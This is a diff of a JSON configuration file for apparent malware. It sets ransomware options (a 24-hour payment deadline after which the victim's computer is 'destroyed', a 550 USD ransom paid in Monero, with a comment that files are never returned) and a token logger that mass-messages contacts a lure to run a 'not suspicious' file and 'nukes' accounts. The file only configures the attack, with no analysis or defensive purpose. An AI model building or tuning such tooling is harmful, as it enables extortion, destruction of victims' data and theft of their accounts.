@@ -11,15 +11,17 @@
             "REBOOTS_ALLOWED": 5,
             "PAYMENT_TIMELIMIT_IN_HOURS": 24,
             "//comment": "How many hours the user has to send the payment, if time is up their computer is destroyed.",
-            "WALLET": "",
+            "WALLET": "testing",
             "RANSOM_AMOUNT": 550,
-            "//comment2": "Price to retrieve their files in USD (It won't actually return their files)"
+            "//comment2": "Price to retrieve their files in USD (It won't actually return their files)",
+            "CRYPTO_CURRENCY_TYPE": "Monero (XMR)",
+            "//comment3": "The type of crypto wawllet, can be whatever type of crypto you want, BTC, LTC Etc"
         }
     ],
     "TOKEN_LOGGER": [true, 
         {
             "MASSDM": true,
-            "MASSDM_SCRIPT": "Hey run my super not suspcious file!",
+            "MASSDM_SCRIPT": "Hey run my super not suspcious file! \n New Line",
             "AUTO_NUKE": true
         }
     ],
